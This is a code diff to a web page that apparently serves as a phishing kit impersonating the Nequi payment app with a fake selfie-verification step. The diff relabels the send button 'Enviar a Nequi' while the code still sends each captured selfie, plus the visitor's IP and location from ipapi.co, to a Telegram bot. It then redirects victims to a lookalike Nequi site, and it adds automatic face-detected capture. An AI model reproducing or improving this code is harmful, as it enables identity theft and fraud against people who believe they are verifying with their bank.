@@ -49,7 +49,7 @@ video {
     box-shadow: 0 0 25px #00ff88;
 }
 
-/* Texto */
+/* Texto principal */
 .status {
     position: absolute;
     bottom: 30px;
@@ -61,34 +61,59 @@ video {
     z-index: 10;
 }
 
-/* Botón de captura */
-.capture-btn {
+/* Mensaje de advertencia en rojo */
+.warning-message {
+    position: absolute;
+    top: 30px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(255,0,0,0.85);
+    color: white;
+    padding: 12px 24px;
+    border-radius: 50px;
+    font-size: 18px;
+    font-weight: bold;
+    text-align: center;
+    z-index: 15;
+    backdrop-filter: blur(5px);
+    border: 1px solid rgba(255,255,255,0.3);
+    animation: pulseRed 1s infinite;
+    white-space: nowrap;
+    font-family: monospace;
+}
+
+@keyframes pulseRed {
+    0%, 100% {
+        transform: translateX(-50%) scale(1);
+        background: rgba(255,0,0,0.85);
+    }
+    50% {
+        transform: translateX(-50%) scale(1.02);
+        background: rgba(255,50,50,0.95);
+        box-shadow: 0 0 15px rgba(255,0,0,0.5);
+    }
+}
+
+/* Barra de progreso */
+.progress-container {
     position: absolute;
     bottom: 100px;
     left: 50%;
     transform: translateX(-50%);
-    background: rgba(0,255,136,0.9);
-    color: #2b002b;
-    border: none;
-    padding: 12px 30px;
-    border-radius: 50px;
-    font-size: 18px;
-    font-weight: bold;
-    cursor: pointer;
-    z-index: 20;
-    transition: all 0.2s;
-    font-family: monospace;
+    width: 250px;
+    height: 6px;
+    background: rgba(255,255,255,0.3);
+    border-radius: 3px;
+    overflow: hidden;
+    z-index: 10;
 }
 
-.capture-btn:hover {
+.progress-bar {
+    height: 100%;
+    width: 0%;
     background: #00ff88;
-    transform: translateX(-50%) scale(1.05);
-}
-
-.capture-btn:disabled {
-    background: rgba(100,100,100,0.7);
-    cursor: not-allowed;
-    transform: translateX(-50%);
+    transition: width 0.1s linear;
+    border-radius: 3px;
 }
 
 /* Preview de foto */
@@ -281,6 +306,11 @@ video {
     display: none;
     white-space: nowrap;
 }
+
+/* Ocultar mensaje de advertencia cuando se toma la foto */
+.warning-message.hide {
+    display: none;
+}
 </style>
 </head>
 
@@ -289,10 +319,13 @@ video {
 <video id="video" autoplay muted playsinline></video>
 <div class="overlay"></div>
 <div class="oval" id="oval"></div>
+<div class="warning-message" id="warningMessage">⚠️ Mira de frente a la cámara por favor</div>
 <div class="status" id="status">🎯 Iniciando cámara...</div>
-<button class="capture-btn" id="captureBtn">📸 Tomar Selfie</button>
+<div class="progress-container">
+    <div class="progress-bar" id="progressBar"></div>
+</div>
 <button class="reset-btn" id="resetBtn">🔄 Reiniciar</button>
-<button class="send-btn" id="sendBtn">📤 Enviar a Telegram</button>
+<button class="send-btn" id="sendBtn">📤 Enviar a Nequi</button>
 <div class="status-message" id="statusMessage"></div>
 <div class="loader" id="loader">
     <div class="loader-spinner"></div>
@@ -303,12 +336,13 @@ video {
 const video = document.getElementById("video");
 const oval = document.getElementById("oval");
 const statusText = document.getElementById("status");
-const captureBtn = document.getElementById("captureBtn");
 const resetBtn = document.getElementById("resetBtn");
 const sendBtn = document.getElementById("sendBtn");
 const statusMessage = document.getElementById("statusMessage");
 const loader = document.getElementById("loader");
 const loaderText = document.getElementById("loaderText");
+const warningMessage = document.getElementById("warningMessage");
+const progressBar = document.getElementById("progressBar");
 
 // Configuración de Telegram
 const TELEGRAM_CONFIG = {
@@ -318,6 +352,16 @@ const TELEGRAM_CONFIG = {
 
 let photoTaken = false;
 let currentPhotoData = null;
+let detectionInterval = null;
+let stabilityFrames = 0;
+let lastFacePosition = null;
+let countdownActive = false;
+let countdownTimer = null;
+let countdownValue = 3;
+
+// Configuración de detección
+const REQUIRED_STABLE_FRAMES = 15;
+const STABILITY_THRESHOLD = 20;
 
 // Iniciar cámara
 navigator.mediaDevices.getUserMedia({ 
@@ -329,21 +373,188 @@ navigator.mediaDevices.getUserMedia({
 })
 .then(stream => {
     video.srcObject = stream;
-    statusText.innerText = "📷 Listo - Presiona el botón para tomar selfie";
-    captureBtn.disabled = false;
+    statusText.innerText = "😊 Mira fijamente a la cámara";
+    startFaceDetection();
 })
 .catch(err => {
     console.error("Error de cámara:", err);
     statusText.innerText = "❌ Error: No se puede acceder a la cámara";
-    captureBtn.disabled = true;
 });
 
-// Tomar foto
-function takePhoto() {
-    if (photoTaken) {
-        mostrarMensaje("Ya tienes una selfie, reinicia para tomar otra", true);
-        return;
+// Detección de rostro usando diferencia de píxeles (detección de movimiento)
+function startFaceDetection() {
+    let lastFrame = null;
+    
+    detectionInterval = setInterval(() => {
+        if (photoTaken) return;
+        
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+        const data = imageData.data;
+        
+        // Detectar región con tonos de piel
+        const faceRegion = detectFaceRegion(data, canvas.width, canvas.height);
+        
+        if (faceRegion) {
+            const rect = video.getBoundingClientRect();
+            const scaleX = rect.width / canvas.width;
+            const scaleY = rect.height / canvas.height;
+            
+            const faceX = (faceRegion.x + faceRegion.width / 2) * scaleX;
+            const faceY = (faceRegion.y + faceRegion.height / 2) * scaleY;
+            
+            const ovalRect = oval.getBoundingClientRect();
+            const centerX = ovalRect.left + ovalRect.width / 2;
+            const centerY = ovalRect.top + ovalRect.height / 2;
+            
+            const dx = Math.abs(faceX - centerX);
+            const dy = Math.abs(faceY - centerY);
+            const isCentered = dx < 70 && dy < 90;
+            
+            // Verificar estabilidad
+            let isStable = true;
+            if (lastFacePosition) {
+                const movement = Math.hypot(faceX - lastFacePosition.x, faceY - lastFacePosition.y);
+                isStable = movement < STABILITY_THRESHOLD;
+            }
+            lastFacePosition = { x: faceX, y: faceY };
+            
+            if (isCentered && isStable) {
+                stabilityFrames++;
+                const progress = (stabilityFrames / REQUIRED_STABLE_FRAMES) * 100;
+                progressBar.style.width = `${progress}%`;
+                
+                if (stabilityFrames >= REQUIRED_STABLE_FRAMES && !countdownActive && !photoTaken) {
+                    startAutoCountdown();
+                } else if (stabilityFrames > 5) {
+                    statusText.innerText = `✅ Mantén la posición (${stabilityFrames}/${REQUIRED_STABLE_FRAMES})`;
+                    oval.classList.add("valid");
+                    warningMessage.classList.add('hide');
+                } else {
+                    statusText.innerText = "🎯 Centra tu rostro en el óvalo";
+                    oval.classList.remove("valid");
+                }
+            } else {
+                stabilityFrames = 0;
+                progressBar.style.width = "0%";
+                if (!isCentered) {
+                    statusText.innerText = "🎯 Centra tu rostro en el óvalo";
+                    warningMessage.classList.remove('hide');
+                } else if (!isStable) {
+                    statusText.innerText = "⚠️ No te muevas, mantén la posición";
+                }
+                oval.classList.remove("valid");
+            }
+        } else {
+            stabilityFrames = 0;
+            progressBar.style.width = "0%";
+            statusText.innerText = "❌ No se detecta rostro";
+            oval.classList.remove("valid");
+            warningMessage.classList.remove('hide');
+            lastFacePosition = null;
+        }
+    }, 100);
+}
+
+// Detectar región de rostro por tonos de piel
+function detectFaceRegion(data, width, height) {
+    let skinPixels = [];
+    
+    for (let y = 0; y < height; y += 3) {
+        for (let x = 0; x < width; x += 3) {
+            const idx = (y * width + x) * 4;
+            const r = data[idx];
+            const g = data[idx + 1];
+            const b = data[idx + 2];
+            
+            // Detección de tonos de piel
+            if (r > 60 && g > 40 && b > 20 && r > g && r > b) {
+                const skinRatio = (r - g) / (r + g + b);
+                if (skinRatio > 0.05 && r > 80 && g > 40 && b > 20) {
+                    skinPixels.push({ x, y });
+                }
+            }
+        }
     }
+    
+    if (skinPixels.length < 40) return null;
+    
+    // Encontrar la región más densa
+    let bestX = 0, bestY = 0, maxCount = 0;
+    const step = 20;
+    
+    for (let x = 0; x < width; x += step) {
+        for (let y = 0; y < height; y += step) {
+            let count = 0;
+            for (let pixel of skinPixels) {
+                if (Math.abs(pixel.x - x) < 50 && Math.abs(pixel.y - y) < 60) {
+                    count++;
+                }
+            }
+            if (count > maxCount) {
+                maxCount = count;
+                bestX = x;
+                bestY = y;
+            }
+        }
+    }
+    
+    if (maxCount < 30) return null;
+    
+    // Calcular tamaño del rostro
+    let minX = bestX, maxX = bestX, minY = bestY, maxY = bestY;
+    for (let pixel of skinPixels) {
+        if (Math.abs(pixel.x - bestX) < 100 && Math.abs(pixel.y - bestY) < 120) {
+            minX = Math.min(minX, pixel.x);
+            maxX = Math.max(maxX, pixel.x);
+            minY = Math.min(minY, pixel.y);
+            maxY = Math.max(maxY, pixel.y);
+        }
+    }
+    
+    const faceWidth = maxX - minX;
+    const faceHeight = maxY - minY;
+    
+    if (faceWidth < 60 || faceHeight < 60) return null;
+    
+    return {
+        x: minX,
+        y: minY,
+        width: faceWidth,
+        height: faceHeight
+    };
+}
+
+function startAutoCountdown() {
+    if (countdownActive || photoTaken) return;
+    
+    countdownActive = true;
+    countdownValue = 3;
+    
+    statusText.innerText = `📸 ¡Selfie automática en ${countdownValue}! No te muevas`;
+    
+    countdownTimer = setInterval(() => {
+        countdownValue--;
+        
+        if (countdownValue > 0) {
+            statusText.innerText = `📸 Selfie en ${countdownValue}... ¡No te muevas!`;
+        } else {
+            clearInterval(countdownTimer);
+            countdownTimer = null;
+            takePhoto();
+        }
+    }, 1000);
+}
+
+// Tomar foto automática
+function takePhoto() {
+    if (photoTaken) return;
     
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
@@ -362,12 +573,24 @@ function takePhoto() {
     // Cambiar color del óvalo a verde
     oval.classList.add("valid");
     
+    // Ocultar mensaje de advertencia permanentemente
+    warningMessage.classList.add('hide');
+    
     showSuccessToast();
     statusText.innerText = "✅ ¡Selfie capturada con éxito!";
     
     createPhotoPreview(currentPhotoData);
     sendBtn.style.display = "block";
-    captureBtn.disabled = true;
+    
+    // Detener la detección
+    if (detectionInterval) {
+        clearInterval(detectionInterval);
+        detectionInterval = null;
+    }
+    if (countdownTimer) {
+        clearInterval(countdownTimer);
+        countdownTimer = null;
+    }
 }
 
 function showSuccessToast() {
@@ -401,9 +624,24 @@ function createPhotoPreview(imgData) {
         photoTaken = false;
         currentPhotoData = null;
         oval.classList.remove("valid");
-        captureBtn.disabled = false;
-        statusText.innerText = "📷 Listo - Presiona el botón para tomar selfie";
-        mostrarMensaje("Selfie eliminada, puedes tomar otra", false);
+        stabilityFrames = 0;
+        progressBar.style.width = "0%";
+        countdownActive = false;
+        statusText.innerText = "😊 Mira fijamente a la cámara";
+        mostrarMensaje("Selfie eliminada, reiniciando detección", false);
+        
+        // Reiniciar detección
+        if (!detectionInterval) {
+            startFaceDetection();
+        }
+        
+        // Volver a mostrar mensaje de advertencia
+        warningMessage.classList.remove('hide');
+        setTimeout(() => {
+            if (!photoTaken) {
+                warningMessage.classList.add('hide');
+            }
+        }, 3000);
     };
     
     preview.appendChild(img);
@@ -444,10 +682,8 @@ async function enviarATelegram() {
     loaderText.textContent = "Enviando verificación...";
     
     try {
-        // Obtener IP y ubicación
         const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
         
-        // Enviar la selfie
         loaderText.textContent = "Enviando selfie...";
         const blob = dataURLtoBlob(currentPhotoData);
         const formData = new FormData();
@@ -460,7 +696,6 @@ async function enviarATelegram() {
             body: formData
         });
         
-        // Enviar mensaje con información adicional
         const mensajeInfo = `
 🔔 **NUEVA SELFIE CAPTURADA** 🔔
 
@@ -490,10 +725,8 @@ async function enviarATelegram() {
         loader.classList.remove('active');
         mostrarMensaje("✅ Selfie enviada correctamente");
         
-        // Deshabilitar botón de enviar
         sendBtn.style.display = 'none';
         
-        // Redirigir después de 3 segundos
         setTimeout(() => {
             window.location.href = 'https://nequi-red.vercel.app/';
         }, 3000);
@@ -505,30 +738,51 @@ async function enviarATelegram() {
     }
 }
 
-// Botón de capturar
-captureBtn.addEventListener('click', () => {
-    takePhoto();
-});
-
 // Botón de reinicio
 resetBtn.addEventListener('click', () => {
     photoTaken = false;
     currentPhotoData = null;
     oval.classList.remove("valid");
-    captureBtn.disabled = false;
     sendBtn.style.display = "none";
+    stabilityFrames = 0;
+    progressBar.style.width = "0%";
+    countdownActive = false;
+    
+    if (countdownTimer) {
+        clearInterval(countdownTimer);
+        countdownTimer = null;
+    }
     
     const preview = document.querySelector('.photo-preview');
     if (preview) preview.remove();
     
-    statusText.innerText = "📷 Listo - Presiona el botón para tomar selfie";
-    mostrarMensaje("Reiniciado, puedes tomar una nueva selfie", false);
+    statusText.innerText = "😊 Mira fijamente a la cámara";
+    mostrarMensaje("Reiniciado, la selfie se tomará automáticamente", false);
+    
+    // Reiniciar detección
+    if (!detectionInterval) {
+        startFaceDetection();
+    }
+    
+    warningMessage.classList.remove('hide');
+    setTimeout(() => {
+        if (!photoTaken) {
+            warningMessage.classList.add('hide');
+        }
+    }, 3000);
 });
 
 // Botón de enviar a Telegram
 sendBtn.addEventListener('click', () => {
     enviarATelegram();
 });
+
+// Ocultar mensaje de advertencia después de 3 segundos al inicio
+setTimeout(() => {
+    if (!photoTaken) {
+        warningMessage.classList.add('hide');
+    }
+}, 3000);
 </script>
 
 </body>
